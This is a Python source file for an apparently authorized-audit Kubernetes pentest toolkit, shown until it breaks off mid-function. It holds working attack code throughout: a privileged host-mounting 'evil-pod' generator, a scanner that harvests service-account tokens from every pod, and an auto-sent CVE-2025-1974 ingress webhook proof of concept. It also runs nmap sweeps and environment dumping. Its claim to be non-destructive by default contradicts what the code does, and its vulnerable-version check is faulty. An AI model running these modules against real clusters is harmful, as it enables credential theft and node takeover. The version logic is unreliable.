#!/usr/bin/env python3
"""
k8s-pentest-framework - a small, extendable Kubernetes pentest toolkit for AppSec audits.

This version includes:
 - pod2node privileged-pod YAML generator (shows kubectl apply command and supports editing via $EDITOR/nano/vi)
 - privileged container scanner
 - RBAC token scanner
 - ingress checker: extracts ingress controller image/version, checks for CVE-2025-1974 vulnerability, uses PoC annotation from hardcoded JSON, patches existing Ingress or creates new
 - nodeport scanner
 - envinfo: Gain environment information from a pod
 - registryscan: Search for registries in the cluster and suggest curling them
 - nsbypass: Kubernetes namespaces bypass check (list ns and try access pods)
 - corecheck: Check core components (apiserver flags, etcd no-TLS, kubelet anon access)
 - shell: Spawn a shell and return to menu

Design goals:
 - Single-file, easy to read and extend.
 - Non-destructive by default: nothing is applied without an explicit print+instruction for `kubectl apply`.
 - Clear structure: add new commands by creating a function and registering it in COMMANDS.

Usage: run inside a context that has kubectl configured for the target cluster (your namespace access).

Author: generated for you. Use responsibly.
"""

import subprocess
import tempfile
import json
import os
import sys
from shutil import which
from datetime import datetime
from packaging import version
from loguru import logger
import time
import re
import requests
import urllib3
from typing import Optional, Tuple, Dict, Any

# Configure loguru to output to stdout/stderr with colors
logger.remove()  # Remove default handler
logger.add(sys.stdout, colorize=True, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{message}</cyan>")
logger.add(sys.stderr, colorize=True, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <red>{message}</red>", level="ERROR")

# Отключаем предупреждения о SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------
# Configuration
# ---------------------
DANGEROUS_PERMISSIONS = [
    "get secrets",
    "create pods",
    "delete pods",
    "get nodes",
    "create deployments",
    "patch deployments",
    "get services",
    "create services",
    "get configmaps",
    "create configmaps",
]

# Safe ingress payload presets (NON-EXPLOITATIVE examples inspired by public PoCs but limited to harmless header injection)
INGRESS_PAYLOAD_PRESETS = {
    'add-header': {
        'description': 'Add a harmless response header (safe for audits)',
        'annotation_key': 'nginx.ingress.kubernetes.io/configuration-snippet',
        'annotation_value': 'add_header X-ONRE-Test "onre-audit";'
    },
    'set-original-url-header': {
        'description': 'Set X-Original-URL header into the response (safe, non-exec)',
        'annotation_key': 'nginx.ingress.kubernetes.io/configuration-snippet',
        'annotation_value': 'add_header X-Original-URL $request_uri;'
    }
}

# URL for the ingress-nginx-controller YAML
INGRESS_CONTROLLER_YAML_URL = "https://raw.githubusercontent.com/sandumjacob/IngressNightmare-POCs/main/ingress-nginx-controller.yaml"

# Hardcoded poc.json content
POC_JSON_CONTENT = '''{
  "apiVersion": "admission.k8s.io/v1",
  "kind": "AdmissionReview",
  "request": {
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "",
      "version": "v1",
      "resource": "namespaces"
    },
    "operation": "CREATE",
    "object": {
      "metadata": {
        "name": "deads",
        "annotations": {
            "nginx.ingress.kubernetes.io/mirror-host": "test"
        }
      },
      "spec": {
        "rules": [
        {
            "host": "jacobsandum.com",
            "http": {
            "paths": [
                {
                "path": "/",
                "pathType": "Prefix",
                "backend": {
                    "service": {
                    "name": "kubernetes",
                    "port": {
                        "number": 80
                    }
                    }
                }
                }
            ]
            }
        }
        ],
        "ingressClassName": "nginx"
      }
    }
  }
}'''

# Global variable to track if banner has been shown in this session
BANNER_SHOWN = False

# ---------------------
# Banner (scary + ONRE)
# ---------------------
BANNER = r'''
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##+*%%@@%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%-:::-=++@@%+**@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%%::...:-++.%%===*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@#%::....-.:..#%::--#*%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-%=-:...:.*: .##:.:::+%*@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%#*.:.:.. -#%.:#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*+=+=*%#+=...##+*#%#%#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%*#++=-=#--*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**-=+=*+=-:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+:-::++==%@@@=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-:=-:-=:-%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#-..::...::.*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%##=:..-:.   ......+*+*#*#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##+-..::=-.    ..:.  ..::=---*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++*-:..-=-=---:...-.     ..::-=#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*++-.::=-*****#+.-:. . ..:-===#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**+==-=+*%@%%%%%%+=+...:::==++*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**==*+-=#+=***=+#=:--::==+=+*#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##+-=+=---.=---::..-==-++***+*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%*#=+===-:::.....:.:-=:++++***@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%***=++####%##++:=-+++****#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%#*%%@@@@@@@@%#+=++*#*%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#%@@@@@@@@@@@@@%+#*##%%%%@%%*.=#@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@##*#*#%%@%%. -+#%@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@%%@@@@@@@@@@@@@@@#%##%%%@%%.:+#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%=-*%@@@@@@@@@@*:+###*@%%%@@@@@@@@@@@%%#%%%@%%%.:+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#=.+++##@@@@@@@@##%%%%%%#%##%%%%%%%%@%%%%%%%%%#..*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#=*##%%%%%@@@@@@@%%%@@%%@%%%%%%%%%@@@@%%@%%%%..:*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%@@@@@@%%%%@%@%%%%@@@@@@@@@@@@@%+.:*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@###%%%%%%%#*:%@@@@@%%%%@@%%%@@@@@@@@@@%%.:*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%##@@@@%@%%%%%%%@@@@@@@@%%..*%%@@*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@@%#=+@@%#%%%%%%%%%+%%%#=..*#%@@@*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%@%#+=..*#%%%@@%%%*....+#%%%@@@%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%%#=...#%%%@@@%%####%%%@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%##+.*%%%@@%%%%%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%*#%%%%%%%@@%@@@@%@@@@@%@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%%%###############=. .*#%%%%%@@@%%@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%%%#:. ...... .......   .-#%%%%%@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@%%#... ....-=++-:.:-==-=+*+##%%%%%%%%%@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%=.  ..++**####%########%#%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@*:.:+*##%##%%%#%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@#+*##%%#%%%@@@@@@@@@@@@@@@%%##%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%.#%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%+...+#%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%#-.....=*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#........::-=*##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%#.. ..:+===*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%*...:==*%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%. .=*##%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%#*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                     O N R E

             a tiny, extendable k8s pentest toolkit
'''

# ---------------------
# Helpers
# ---------------------

def check_prereqs():
    for cmd in ("kubectl", "curl"):
        if which(cmd) is None:
            logger.error(f"{cmd} not found in PATH. Install it or add to PATH.")
            sys.exit(1)
    if which("nmap") is None:
        logger.warning("nmap not found in PATH. Install it for NodePort scanning.")
    if which("etcdctl") is None:
        logger.warning("etcdctl not found in PATH. Install it for etcd access check.")

def run(cmd, capture=True, check=False, input=None):
    """Run a shell command. Returns CompletedProcess"""
    try:
        if capture:
            return subprocess.run(cmd, shell=True, check=check, stdout=subprocess.PIPE, stderr=subprocess.PIPE, input=input, text=True)
        else:
            return subprocess.run(cmd, shell=True, check=check)
    except Exception as e:
        logger.error(f"Failed to run command '{cmd}': {e}")
        return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(e))

def kubectl_json(cmd_tail):
    """Run kubectl and parse JSON output"""
    cp = run(f"kubectl {cmd_tail} -o json")
    if cp.returncode != 0:
        logger.error(f"Could not execute 'kubectl {cmd_tail}': {cp.stderr}")
        return None
    try:
        return json.loads(cp.stdout)
    except json.JSONDecodeError:
        logger.error(f"Invalid JSON from 'kubectl {cmd_tail}'")
        return None

def detect_editor():
    """Detect an editor: $EDITOR, then nano, then vi/vim. Return command or None."""
    env = os.environ.get('EDITOR')
    if env:
        return env
    for e in ('nano', 'vi', 'vim'):
        if which(e):
            return e
    return None

def edit_tempfile(initial_text, suffix='.yml'):
    """Write initial_text to a temp file, open editor if available, return edited content (or None if not edited)."""
    editor = detect_editor()
    with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix=suffix) as tf:
        path = tf.name
        tf.write(initial_text)
        tf.flush()

    if editor is None:
        logger.warning(f"No editor found ($EDITOR, nano, vi). Skipping edit. You can manually edit the saved file at {path}")
        with open(path, 'r') as f:
            content = f.read()
        return content, path

    logger.info(f"Opening editor: {editor} {path}")
    try:
        subprocess.run(f"{editor} {path}", shell=True)
    except Exception as e:
        logger.error(f"Failed to run editor: {e}")
    with open(path, 'r') as f:
        content = f.read()
    return content, path

# ---------------------
# Modules (functions to extend)
# ---------------------

def pod2node_interactive():
    """Gather nodes, pods and offer to generate a privileged 'evil' pod YAML for a specific node."""
    logger.info("[1] pod2node check / privileged-pod generator")
    nodes = kubectl_json("get nodes")
    if not nodes:
        logger.error("Could not get nodes. Check kubectl context and permissions.")
        return

    node_names = [n['metadata']['name'] for n in nodes.get('items', [])]
    logger.info(f"Found {len(node_names)} nodes")
    for i, n in enumerate(node_names, 1):
        logger.info(f"   {i}. {n}")

    choice = input("Choose a node index to target (or press Enter to cancel): ").strip()
    if not choice:
        logger.info("Cancelled.")
        return
    try:
        idx = int(choice) - 1
        target_node = node_names[idx]
    except (ValueError, IndexError):
        logger.error("Invalid choice")
        return

    # Default YAML
    default_image = 'busybox'
    yaml_template = f"""
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: evil-pod
  name: evil-pod
  namespace: audit
spec:
  nodeName: {target_node}
  hostPID: true
  hostIPC: true
  hostNetwork: true
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: {default_image}
    name: evil-pod
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-fs
      mountPath: /host
  restartPolicy: Never
"""

    logger.info("Generated evil pod YAML (dry run):\n")
    logger.info(f"\n{yaml_template}")

    # Offer to edit
    if input('Edit YAML before saving? [y/N]: ').lower().startswith('y'):
        edited, tmp_path = edit_tempfile(yaml_template, suffix='.yml')
        logger.info("Edited YAML preview:\n")
        logger.info(f"\n{edited}")
        final_yaml = edited
    else:
        final_yaml = yaml_template
        tmp_path = None

    # Save
    save_path = input('Save YAML to file path (default ./evil-pod.yml): ').strip() or './evil-pod.yml'
    with open(save_path, 'w') as f:
        f.write(final_yaml)
    logger.success(f"Wrote {save_path}")

    # Show exact kubectl apply command (do not execute)
    logger.info("To apply this manifest (ONLY in authorized test environments) run:")
    logger.info(f"  kubectl apply -f {save_path}")
    logger.warning("Note: this manifest is privileged. Do NOT apply against systems you do not own.")

def privileged_containers_scan():
    """Search for containers/pods with privileged:true across namespaces and show quick info."""
    logger.info("[2] Scanning for privileged containers in all namespaces...")
    pods = kubectl_json("get pods --all-namespaces")
    if not pods:
        logger.error("Could not list pods.")
        return

    found = []
    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        for c in p.get('spec', {}).get('containers', []):
            sc = c.get('securityContext') or {}
            if sc.get('privileged') or sc.get('allowPrivilegeEscalation'):
                found.append((ns, name, c.get('name'), c.get('image'), sc))

    if not found:
        logger.info("No privileged containers found (quick scan).")
        return

    logger.info(f"Found {len(found)} potentially privileged containers:")
    for ns, pod, cname, image, sc in found:
        logger.info(f"   - {ns}/{pod} container={cname} image={image} sc={sc}")
    logger.info("You can try to exec into them manually with `kubectl exec -n <ns> -it <pod> -c <container> -- /bin/sh`")

def rbac_token_checker():
    """RBAC checker: for each pod try to read the serviceaccount token and check dangerous permissions."""
    logger.info("[3] RBAC token scanner (attempts to read SA tokens from pods)")
    api_server_cp = run("kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}'")
    if api_server_cp.returncode != 0:
        logger.error("Could not determine API server URL. Aborting.")
        return
    API_SERVER = api_server_cp.stdout.strip().strip("'")

    pods = kubectl_json('get pods --all-namespaces')
    if not pods:
        logger.error("Could not list pods. Aborting.")
        return

    report_lines = []
    total_pods = 0
    total_dangerous = 0

    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        total_pods += 1
        logger.info(f"Checking {ns}/{name} ...")
        cp = run(f"kubectl exec -n {ns} {name} -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", capture=True)
        token = cp.stdout.strip() if cp.returncode == 0 else ''
        if not token:
            logger.info("No token found")
            continue

        with tempfile.NamedTemporaryFile(mode='w', delete=False) as tf:
            kubeconfig = tf.name
            tf.write(f"""apiVersion: v1
kind: Config
clusters:
- name: temp-cluster
  cluster:
    insecure-skip-tls-verify: true
    server: {API_SERVER}
users:
- name: temp-user
  user:
    token: {token}
contexts:
- name: temp-context
  context:
    cluster: temp-cluster
    user: temp-user
current-context: temp-context
""")

        dangerous_found = []
        for perm in DANGEROUS_PERMISSIONS:
            cp_can = run(f"kubectl --kubeconfig={kubeconfig} auth can-i {perm}")
            if cp_can.returncode == 0 and 'yes' in cp_can.stdout:
                dangerous_found.append(perm)
        os.unlink(kubeconfig)

        if dangerous_found:
            total_dangerous += 1
            sa_name = p.get('spec', {}).get('serviceAccountName')
            logger.warning(f"DANGEROUS -> {dangerous_found} (SA: {sa_name})")
            report_lines.append(f"{ns}/{name} -> {dangerous_found} (SA: {sa_name})")
        else:
            logger.success("No dangerous permissions found")

    logger.info("--- RBAC scan summary ---")
    logger.info(f"Pods scanned: {total_pods}")
    logger.info(f"Pods with dangerous SA perms: {total_dangerous}")
    if report_lines:
        logger.info("Detailed findings:")
        for l in report_lines:
            logger.info(f"  {l}")
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    report_path = f"/tmp/k8s_rbac_report_{ts}.txt"
    with open(report_path, 'w') as rf:
        rf.write('\n'.join(report_lines))
    logger.success(f"Full report saved to: {report_path}")

def is_vulnerable_version(tag):
    """Check if the ingress controller version is vulnerable to CVE-2025-1974."""
    try:
        ver = version.parse(tag)
        return ver < version.parse("1.12.1") or ver < version.parse("1.11.5")
    except version.InvalidVersion:
        logger.warning(f"Could not parse version tag: {tag}")
        return False

def parse_image_version(image):
    """Attempt to parse a k8s image string and return (repo, name, tag)."""
    if not image:
        return (None, None, None)
    parts = image.split('/')
    last = parts[-1]
    if ':' in last:
        name, tag = last.split(':', 1)
    else:
        name, tag = last, 'latest'
    repo = '/'.join(parts[:-1] + [name])
    return repo, name, tag

def ingress_checker():
    logger.info("[4] Ingress controller version and CVE-2025-1974 PoC helper")

    POC_JSON = POC_JSON_CONTENT

    def run_command(cmd: str, capture: bool = True, check: bool = False) -> Optional[subprocess.CompletedProcess]:
        """Выполняет команду и возвращает результат"""
        try:
            return subprocess.run(cmd, shell=True, capture_output=capture, text=True, check=check)
        except subprocess.CalledProcessError as e:
            logger.error(f"Command failed: {e.stderr if e.stderr else str(e)}")
            return None
        except Exception as e:
            logger.error(f"Command execution error: {str(e)}")
            return None

    def kubectl_json(cmd_tail: str) -> Optional[Dict[str, Any]]:
        """Выполняет kubectl команду и возвращает JSON результат"""
        cp = run_command(f"kubectl {cmd_tail} -o json", capture=True)
        if cp and cp.returncode == 0:
            try:
                return json.loads(cp.stdout)
            except json.JSONDecodeError:
                logger.error("Invalid JSON from kubectl")
        return None

    def find_ingress_controller() -> Optional[Tuple[str, str]]:
        """Находит ingress-nginx контроллер"""
        # Ищем по стандартным лейблам ingress-nginx
        result = kubectl_json("get pods -A -l app.kubernetes.io/component=controller")
        if result and result.get('items'):
            pod = result['items'][0]
            return pod['metadata']['namespace'], pod['metadata']['name']
        
        # Альтернативный поиск
        cp = run_command("kubectl get pods -A | grep -i ingress-nginx-controller", capture=True)
        if cp and cp.returncode == 0 and cp.stdout:
            for line in cp.stdout.strip().split('\n'):
                if 'ingress-nginx-controller' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        return parts[0], parts[1]
        
        logger.error("No ingress-nginx controller found")
        return None

    def get_ingress_version(namespace: str, pod: str) -> Optional[str]:
        """Получает версию ingress-nginx контроллера"""
        cp = run_command(f"kubectl describe pod {pod} -n {namespace}", capture=True)
        if not cp or cp.returncode != 0:
            return None
        
        # Ищем версию в описании пода
        version_patterns = [
            r'Image:\s+.+?/controller:v?([\d.]+)',
            r'Image:\s+.+?/controller:v?(\d+\.\d+\.\d+)',
            r'Version:\s+v?(\d+\.\d+\.\d+)'
        ]
        for pattern in version_patterns:
            match = re.search(pattern, cp.stdout)
            if match:
                return match.group(1)
        logger.warning("Version not found in pod description.")
        return None

    ingress_controller = find_ingress_controller()
    if not ingress_controller:
        logger.warning("No ingress controller pods found.")
        return

    namespace, pod = ingress_controller

    version = get_ingress_version(namespace, pod)
    if version:
        vuln_status = "VULNERABLE to CVE-2025-1974" if is_vulnerable_version(version) else "Not vulnerable"
        logger.info(f"Detected ingress controller pod: {namespace}/{pod} -> version={version} ({vuln_status})")
    else:
        logger.warning("Could not extract version from pod.")
        return

    # Webhook port
    webhook_port = 8443  # Default

    # Hardcoded PoC
    poc_data = json.loads(POC_JSON)
    annotation_value = poc_data['request']['object']['metadata']['annotations']['nginx.ingress.kubernetes.io/mirror-host']

    # Automatic mode example
    # Set up port-forward
    local_port = 1337
    port_forward_cmd = f"kubectl port-forward -n {namespace} {pod} {local_port}:{webhook_port}"
    port_forward_proc = subprocess.Popen(port_forward_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    time.sleep(2)

    if port_forward_proc.poll() is not None:
        logger.error(f"Failed to set up port-forward: {port_forward_proc.stderr.read()}")
        return

    # Send PoC
    url = f"https://localhost:{local_port}/validate"
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(url, data=POC_JSON, headers=headers, verify=False)
        logger.info(f"PoC response: {response.text}")
    except Exception as e:
        logger.error(f"Failed to send PoC: {str(e)}")

    # Check logs
    log_cmd = f"kubectl logs {pod} -n {namespace} --tail=50"
    cp = run_command(log_cmd, capture=True)
    if cp and cp.returncode == 0:
        logs = cp.stdout
        # Поиск строки о принятии/отклонении аннотации
        for line in logs.splitlines():
            if 'annotation' in line.lower():
                if 'accepted' in line.lower() or 'valid' in line.lower():
                    logger.success(f"Annotation accepted: {line}")
                    break
                elif 'rejected' in line.lower() or 'denied' in line.lower() or 'invalid' in line.lower():
                    logger.warning(f"Annotation rejected: {line}")
                    break
        else:
            logger.info("No specific annotation log found.")
    else:
        logger.error("Failed to get logs.")

    port_forward_proc.terminate()

def nodeport_scanner():
    """List NodePort services and suggest which IP:port to try from outside the cluster."""
    logger.info("[5] NodePort scanner")
    services = kubectl_json('get svc --all-namespaces')
    if not services:
        logger.error("Could not list services.")
        return

    nodeports = []
    for s in services.get('items', []):
        spec = s.get('spec', {})
        if spec.get('type') == 'NodePort':
            ns = s['metadata']['namespace']
            name = s['metadata']['name']
            for p in spec.get('ports', []):
                nodeports.append((ns, name, p.get('nodePort'), p.get('port'), p.get('protocol')))

    if not nodeports:
        logger.info("No NodePort services found.")
        return

    logger.info("Found NodePort services:")
    for ns, name, nport, port, proto in nodeports:
        logger.info(f"   - {ns}/{name} nodePort={nport} targetPort={port} proto={proto}")

    nodes = kubectl_json('get nodes')
    if nodes:
        for n in nodes.get('items', []):
            addrs = n.get('status', {}).get('addresses', [])
            ips = [a['address'] for a in addrs if a.get('type') in ('ExternalIP', 'InternalIP')]
            logger.info(f"Node {n['metadata']['name']} -> {ips}")
    logger.info("Try <node-ip>:<nodePort> from your testing host if network permits.")

    if input('Run nmap scan on ports 30000-32767 for nodes? [y/N]: ').lower().startswith('y'):
        if which("nmap") is None:
            logger.error("nmap not found. Install nmap to use this feature.")
            return
        if nodes:
            for n in nodes.get('items', []):
                addrs = n.get('status', {}).get('addresses', [])
                ips = [a['address'] for a in addrs if a.get('type') in ('ExternalIP', 'InternalIP')]
                if ips:
                    ip = ips[0]
                    logger.info(f"Scanning Node {n['metadata']['name']} IP {ip} ports 30000-32767...")
                    cp = run(f"nmap -sV -p 30000-32767 {ip}", capture=True)
                    if cp.returncode == 0:
                        logger.info(cp.stdout)
                    else:
                        logger.error(f"Failed: {cp.stderr}")
        else:
            logger.error("No nodes found for scanning.")

def env_info():
    """Gain environment information from a pod: env, /etc/hosts, etc."""
    logger.info("[6] Gaining Environment Information from a pod")
    pods = kubectl_json("get pods --all-namespaces")
    if not pods:
        logger.error("Could not list pods.")
        return

    pod_list = []
    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        pod_list.append((ns, name))

    if not pod_list:
        logger.info("No pods found.")
        return

    logger.info(f"Found {len(pod_list)} pods:")
    for i, (ns, name) in enumerate(pod_list, 1):
        logger.info(f"   {i}. {ns}/{name}")

    choice = input("Choose a pod index to inspect (or press Enter to cancel): ").strip()
    if not choice:
        logger.info("Cancelled.")
        return
    try:
        idx = int(choice) - 1
        ns, name = pod_list[idx]
    except (ValueError, IndexError):
        logger.error("Invalid choice")
        return

    commands = [
        "env",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
        "ip route show",
        "ifconfig"
    ]

    for cmd in commands:
        logger.info(f"Executing: {cmd} in {ns}/{name}")
        cp = run(f"kubectl exec -n {ns} {name} -- {cmd}", capture=True)
        if cp.returncode == 0:
            logger.info(cp.stdout)
        else:
            logger.error(f"Failed: {cp.stderr}")

    logger.info("Use this information for further reconnaissance and attacks.")

def registry_scanner():
    """Search for registries in the cluster and curl /v2/_catalog to check auth."""
    logger.info("[7] Search for registries in the cluster")
    services = kubectl_json('get svc --all-namespaces')
    if not services:
        logger.error("Could not list services.")
        return

    registries = []
    for s in services.get('items', []):
        ns = s['metadata']['namespace']
        name = s['metadata']['name']
        ports = s.get('spec', {}).get('ports', [])
        for p in ports:
            if p.get('port') == 5000 or 'registry' in name.lower():
                cluster_ip = s.get('spec', {}).get('clusterIP')
                domain = f"{name}.{ns}.svc.cluster.local"
                registries.append((ns, name, cluster_ip, domain, p.get('port')))

    if not registries:
        logger.info("No potential registries found (port 5000 or name containing 'registry').")
        return

    logger.info(f"Found {len(registries)} potential registries:")
    for ns, name, ip, domain, port in registries:
        logger.info(f"   - {ns}/{name} IP={ip} domain={domain} port={port}")
        logger.info(f"Checking /v2/_catalog for {domain}:{port}...")
        cp = run(f"curl -s -m 5 http://{domain}:{port}/v2/_catalog", capture=True)
        if cp.returncode == 0:
